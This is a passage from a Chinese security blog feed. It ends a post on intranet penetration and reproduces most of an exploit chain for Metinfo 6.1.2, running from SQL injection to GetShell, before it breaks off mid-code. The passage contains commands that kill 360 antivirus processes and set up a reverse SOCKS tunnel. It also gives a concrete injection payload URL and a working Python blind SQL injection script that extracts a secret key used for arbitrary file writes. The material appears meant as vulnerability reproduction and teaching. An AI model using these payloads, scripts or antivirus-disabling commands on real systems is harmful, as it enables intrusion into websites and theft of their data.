会被腾讯云标记为木马文件，ew_for_Win.exe 测试在这个装有 360 的机器上运行直接被删掉</p><p><strong>3. reGeorg</strong></p><p>放上 tunnel.nosocket.php 后进行连接，或者是用这个PHP 一句话版 <a href="https://github.com/zsxsoft/reGeorg" target="_blank" rel="noopener">reGeorg for PHP One-line Shell</a>，接着本地用 proxifier 配置 socks 代理</p><p>然后它就卡在了这个地方，接着自动退出，有空再分析下原因</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/tLTyaMn849f2igs.png" alt></p><p>这里 lcx、EarthWorm 都遭到了 360 的拦截，网上的免杀 Lcx.exe 也无济于事，reGeorg 也不能很好的工作</p><p>使用 taskkill 结束 360 相关进程，但是一般来说 ZhuDongFangYu.exe 和 360 部分进程还是杀不掉的，需在 360 设置里手动关闭，用 ntsd.exe 也不行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /im 360* /t /f</span><br><span class="line">taskkill /im ZhuDongFangYu.exe /t /f</span><br></pre></td></tr></table></figure><p><strong>sSocks</strong></p><p>360 还是有漏网之鱼，最终使用 ssocks 成功建立代理。。</p><blockquote><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。官方地址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a></p></blockquote><p>vps:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://phoenixnap.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz</span><br><span class="line"> tar -zxf ssocks-0.0.14.tar.gz</span><br><span class="line"> cd ssocks-0.0.14</span><br><span class="line"> ./configure &amp;&amp; make</span><br><span class="line"> cd src</span><br><span class="line"> ./rcsocks -l 1080 -p 1234 -v</span><br></pre></td></tr></table></figure><p>windows 7:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rssocks.exe -s vps:1234</span><br></pre></td></tr></table></figure><p>在本地使用 socks 代理工具配置代理, 成功</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/ITVtcFPjnkbrzCx.png" alt></p><p>这台机器只有一个 工作站域 WorkGroup</p><p><code>net view /domain</code> 查看也只有 WORKGROUP </p><p><code>net view</code> //用来查看跟本机有关联的机器名</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/nOjIKQucVm9ZS54.png" alt></p><p>有个 GAOJIGUANLIYUAN</p><p>不知怎么的，这机器上并没有 nbtstat，先 <code>arp -a</code> 列出本网段内所有活跃的IP地址，IP 不多，屈指可数，再通过 <code>ping -n 1 -a ip</code> 查看 ip 的机器名，成功找的 GAOJIGUANLIYUAN 的 ip 地址</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/aIMAiqRp3o6QczU.png" alt></p><p>该机还装有 TeamViewer，连接列表其中一个远程主机还有一个没有密码的非管理员账户</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/UHMiRyjWaLXPvlO.png" alt></p><p>然后神奇的发现那个 GAOJIGUANLIYUAN 不见了，比较遗憾 (第二天又有了，难道当时下班了？)</p><p>采用编译的方式安装 proxychains 代理 nmap 对远程内网主机进行扫描，这里有个坑，如果用 brew 安装的 proxychains 会出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rofl0r/proxychains-ng</span><br><span class="line">cd proxychains-ng</span><br><span class="line">./configure --prefix=/usr/local --bindir=/usr/local/bin --libdir=/usr/local/lib --fat-binary</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/M4zDk3b8NA6GHiU.png" alt></p><p>看样子可以使用 <code>MS17_010</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://j0k3r.top/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo 6.1.2 从 SQL 注入到 GetShell 复现&amp;分析</title>
    <link href="http://j0k3r.top/2019/05/01/Metinfo612/"/>
    <id>http://j0k3r.top/2019/05/01/Metinfo612/</id>
    <published>2019-04-30T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:24.252Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><p>基于 Metinfo 6.1.2，源码可到 <a href="https://www.metinfo.cn/download/" target="_blank" rel="noopener">https://www.metinfo.cn/download/</a> 下载</p><p>位于 app/system/include/class/web.class.php 468 行开始的 web 类的析构函数中存在任意文件写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="comment">//读取缓冲区数据</span></span><br><span class="line">$output = str_replace(<span class="keyword">array</span>(<span class="string">'&lt;!--&lt;!----&gt;'</span>,<span class="string">'&lt;!----&gt;'</span>,<span class="string">'&lt;!--fck--&gt;'</span>,<span class="string">'&lt;!--fck'</span>,<span class="string">'fck--&gt;'</span>,<span class="string">''</span>,<span class="string">"\r"</span>,substr($admin_url,<span class="number">0</span>,<span class="number">-1</span>)),<span class="string">''</span>,ob_get_contents());</span><br><span class="line">ob_end_clean();<span class="comment">//清空缓冲区</span></span><br><span class="line">$output = <span class="keyword">$this</span>-&gt;video_replace(<span class="string">'/(&lt;video.*?edui-upload-video.*?&gt;).*?&lt;\/video&gt;/'</span>, $output);</span><br><span class="line">$output = <span class="keyword">$this</span>-&gt;video_replace(<span class="string">'/(&lt;embed.*?edui-faked-video.*?&gt;)/'</span>, $output);</span><br><span class="line">       <span class="keyword">if</span>($_M[<span class="string">'config'</span>][<span class="string">'met_qiniu_cloud'</span>]) &#123;</span><br><span class="line">           $output = load::plugin(<span class="string">'dofooter_replace'</span>, <span class="number">1</span>, <span class="keyword">array</span>(<span class="string">'data'</span> =&gt; $output));</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 标签数据处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">load::sys_class(<span class="string">'view/ui_compile'</span>);</span><br><span class="line">$ui_compile = <span class="keyword">new</span> ui_compile();</span><br><span class="line">$output = $ui_compile-&gt;replace_attr($output);</span><br><span class="line"><span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'html_filename'</span>] &amp;&amp; $_M[<span class="string">'form'</span>][<span class="string">'metinfonow'</span>] == $_M[<span class="string">'config'</span>][<span class="string">'met_member_force'</span>])&#123;</span><br><span class="line">$filename = urldecode($_M[<span class="string">'form'</span>][<span class="string">'html_filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS,<span class="string">"WIN"</span>)) &#123;</span><br><span class="line">$filename = @iconv(<span class="string">"utf-8"</span>, <span class="string">"GBK"</span>, $filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(stristr($filename, <span class="string">'.php'</span>))&#123;</span><br><span class="line">jsoncallback(<span class="keyword">array</span>(<span class="string">'suc'</span>=&gt;<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents(PATH_WEB.$filename, $output))&#123;</span><br><span class="line">jsoncallback(<span class="keyword">array</span>(<span class="string">'suc'</span>=&gt;<span class="number">1</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">jsoncallback(<span class="keyword">array</span>(<span class="string">'suc'</span>=&gt;<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $output;<span class="comment">//输出内容</span></span><br><span class="line">&#125;</span><br><span class="line">DB::close();<span class="comment">//关闭数据库连接</span></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中不难看出，若满足 <code>$_M[&#39;form&#39;][&#39;html_filename&#39;] &amp;&amp; $_M[&#39;form&#39;][&#39;metinfonow&#39;] == $_M[&#39;config&#39;][&#39;met_member_force&#39;]</code>，则 ob_get_contents（） 即输出缓冲区中的内容会被写入文件</p><p>而 met_member_force 在安装的时候就被写入了数据库，从 <code>/install/index.php</code> 能看到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">. . . . </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span><span class="params">($i)</span></span>&#123;</span><br><span class="line">  $str = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">  $finalStr = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$i;$j++)</span><br><span class="line">  &#123;</span><br><span class="line">    $finalStr .= substr($str,mt_rand(<span class="number">0</span>,<span class="number">25</span>),<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $finalStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. . . . </span><br><span class="line"></span><br><span class="line">$force =randStr(<span class="number">7</span>);</span><br><span class="line">$query = <span class="string">" UPDATE $met_config set value='$force' where name='met_member_force'"</span>;</span><br><span class="line">mysqli_query($link , $query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'写入数据库失败: '</span> . mysqli_error($link));</span><br></pre></td></tr></table></figure><p>但是我们可以通过 sql 注入获取，在 app\system\message\web\message.class.php 中第43行，<code>{$_M[form][id]}</code> 被直接拼到 sql 语句中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($info)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"><span class="keyword">if</span>(!$_M[form][id])&#123;</span><br><span class="line">          $message=DB::get_one(<span class="string">"select * from &#123;$_M[table][column]&#125; where module= 7 and lang ='&#123;$_M[form][lang]&#125;'"</span>);</span><br><span class="line">          $_M[form][id]=$message[id];</span><br><span class="line">&#125;</span><br><span class="line">$met_fd_ok=DB::get_one(<span class="string">"select * from &#123;$_M[table][config]&#125; where lang ='&#123;$_M[form][lang]&#125;' and  name= 'met_fd_ok' andcolumnid = &#123;$_M[form][id]&#125;"</span>);</span><br><span class="line">       $_M[config][met_fd_ok]= $met_fd_ok[value];</span><br><span class="line"><span class="keyword">if</span>(!$_M[config][met_fd_ok])okinfo(<span class="string">'javascript:history.back();'</span>,<span class="string">"&#123;$_M[word][Feedback5]&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>($_M[config][met_memberlogin_code])&#123;</span><br><span class="line"><span class="keyword">if</span>(!load::sys_class(<span class="string">'pin'</span>, <span class="string">'new'</span>)-&gt;check_pin($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]))&#123;</span><br><span class="line"> okinfo(<span class="number">-1</span>, $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">    . . . . </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于 message 继承自系统一级基类 common，其构造函数首先就对表单进行了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;<span class="comment">//全局数组$_M</span></span><br><span class="line">ob_start();<span class="comment">//开启缓存</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_mysql();<span class="comment">//数据库连接</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_form();<span class="comment">//表单过滤</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_lang();<span class="comment">//加载语言配置</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_config_global();<span class="comment">//加载全站配置数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_url_site();</span><br><span class="line"><span class="keyword">$this</span>-&gt;load_config_lang();<span class="comment">//加载当前语言配置数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;load_url();<span class="comment">//加载url数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时如果我们直接在留言页面进行 sql 注入会被 common.func.php 中的 sqlinsert 函数所过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlinsert</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">$string[$key] = sqlinsert($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$string_old = $string;</span><br><span class="line">$string = str_ireplace(<span class="string">"\\"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"\""</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"'"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"*"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%5C"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%22"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%27"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"%2A"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"~"</span>,<span class="string">"/"</span>,$string);</span><br><span class="line">$string = str_ireplace(<span class="string">"select"</span>, <span class="string">"\sel\ect"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"insert"</span>, <span class="string">"\ins\ert"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"update"</span>, <span class="string">"\up\date"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"delete"</span>, <span class="string">"\de\lete"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"union"</span>, <span class="string">"\un\ion"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"into"</span>, <span class="string">"\in\to"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"load_file"</span>, <span class="string">"\load\_\file"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"outfile"</span>, <span class="string">"\out\file"</span>, $string);</span><br><span class="line">$string = str_ireplace(<span class="string">"sleep"</span>, <span class="string">"\sle\ep"</span>, $string);</span><br><span class="line">$string = strip_tags($string);</span><br><span class="line"><span class="keyword">if</span>($string_old!=$string)&#123;</span><br><span class="line">$string=<span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">$string = trim($string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是细看代码发现在过滤之前，字符串先经过了 daddslashes 函数，而 daddslashes 函数是否执行 sqlinsert 则由 IN_ADMIN 来决定</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string, $force = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line"><span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">$string[$key] = daddslashes($val, $force);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>))&#123;</span><br><span class="line">$string = trim(addslashes(sqlinsert($string)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$string = trim(addslashes($string));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 IN_ADMIN 常量为 true 时，我们的字符串只会进行简单的 addslashes 转义，存在 sql注入，随即全局搜索 IN_ADMIN 常量，在/admin/index.php发现如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_ADMIN'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//�ӿ�</span></span><br><span class="line">$M_MODULE=<span class="string">'admin'</span>;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">'m'</span>])$M_MODULE=$_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'n'</span>])$_GET[<span class="string">'n'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'c'</span>])$_GET[<span class="string">'c'</span>]=<span class="string">"index"</span>;</span><br><span class="line"><span class="keyword">if</span>(@!$_GET[<span class="string">'a'</span>])$_GET[<span class="string">'a'</span>]=<span class="string">"doindex"</span>;</span><br><span class="line">@define(<span class="string">'M_NAME'</span>, $_GET[<span class="string">'n'</span>]);</span><br><span class="line">@define(<span class="string">'M_MODULE'</span>, $M_MODULE);</span><br><span class="line">@define(<span class="string">'M_CLASS'</span>, $_GET[<span class="string">'c'</span>]);</span><br><span class="line">@define(<span class="string">'M_ACTION'</span>, $_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../app/system/entrance.php'</span>;</span><br></pre></td></tr></table></figure><p>我们不但可以得到值为 true 的 IN_ADMIN 常量，而且还可以在这里调用任意do开头的方法，无需登录，所以我们可以利用 domessage 类方法传入 action = add 来进行 sql注入</p><p>通过分析 /app/system/entrance.php 构造利用链，我们需要的是 /app/system/message/web/message.class.php，需传入 M_NAME = message，将 M_TYPE 常量值设为  system，M_MODULE 传入值为 web，此时 PATH_OWN_FILE 常量为 /app/system/message/web/，然后 entrance.php 执行 <code>load::module();</code> 加载 message 模块并传入参数，达到绕过 sqlinsert 执行 add 函数的目的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($path = <span class="string">''</span>, $modulename = <span class="string">''</span>, $action = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!$path) &#123;</span><br><span class="line"><span class="keyword">if</span> (!$path) $path = PATH_OWN_FILE;</span><br><span class="line"><span class="keyword">if</span> (!$modulename) $modulename = M_CLASS;</span><br><span class="line"><span class="keyword">if</span> (!$action) $action = M_ACTION;</span><br><span class="line"><span class="keyword">if</span> (!$action) $action = <span class="string">'doindex'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::_load_class($path, $modulename, $action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>http://127.0.0.1:23332//admin/index.php?n=message&amp;m=web&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=1%20or%20sleep(1)</code></p><p>这里代码判断反馈与验证码都在sql语句的后面，所以我们可以借助页面的不同回显进行 bool 盲注，区别是返回的 value 的有无，通过查询数据库，我们可以注入 columnid 为 44 或 42</p><p> <img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Metinfo612.assets/5cc84dc661df9.png" alt></p><p> 脚本注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://&#123;&#125;/admin/index.php?n=message&amp;m=web&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1&amp;para138=1&amp;para139=1&amp;para140=1&amp;id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_res_len</span><span class="params">(host,sql)</span>:</span></span><br><span class="line"><span class="keyword">global</span> url</span><br><span class="line">url = url.format(host)</span><br><span class="line">max_len = <span class="number">101</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,max_len):</span><br><span class="line">check_sql = <span class="string">"44 and(length((&#123;&#125;))=&#123;&#125;)"</span>.format(sql,str(i))</span><br><span class="line">res = s.get(url+check_sql)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"window.history.back()"</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"data too long"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sqli_data</span><span class="params">(host,sql)</span>:</span></span><br><span class="line"><span class="keyword">global</span> url</span><br><span class="line">data_len = get_res_len(host,sql)</span><br><span class="line">sqli = <span class="string">"44 and(ascii(substr((&#123;&#125;),&#123;&#125;,1)))=&#123;&#125;"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(data_len+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable[<span class="number">0</span>:<span class="number">62</span>]:</span><br><span class="line">res = s.get(url+sqli.format(sql,str(i),ord(c)))</span><br><span class="line"><span class="keyword">if</span> <span class="string">"window.history.back()"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">data += c</span><br><span class="line"><span class="keyword">print</span> (data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">host = <span class="string">"127.0.0.1:23332"</span></span><br><span class="line">sql = <span class="string">"select value from met_config where id = 45"</span></span><br><span class="line">get_sqli_data(host,sql)</span><br></pre></td></tr></table></figure><p> 通过查询数据库得知 met_member_force 的 id 是 45，注入得到 met_member_force 值</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Metinfo612.assets/5cc84f98dd2a0.png" alt></p><p> 再回到任意文件写入上来，拿到了 met_member_force，下面寻找可控的页面输出，全局搜索 extends web 寻找 web 的子类，其子类并不多，而且找到的大多为查数据库得到的配置参数或是一些固定输出，利用难度较大，较可行的应该就是 uploadify 这个子类了，类方法中有多处 echo jsonencode</p><p> 其中在 doupfile 函数中，<code>$back</code> 从表单中获取文件名，最后做 jsonencode 操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doupfile</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $_M;</span><br><span class="line"></span><br><span class="line">. . . . </span><br><span class="line"></span><br><span class="line">$back = <span class="keyword">$this</span>-&gt;upload($_M[<span class="string">'form'</span>][<span class="string">'formname'</span>]);</span><br><span class="line"></span><br><span class="line">. . . .</span><br><span class="line"></span><br><span class="line">   $back[<span class="string">'filesize'</span>] =  round(filesize($back[<span class="string">'path'</span>])/<span class="number">1024</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> jsonencode($back);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向上回溯，由自身的 upload 方法调用了 upfile 的 upload 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($formname)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> 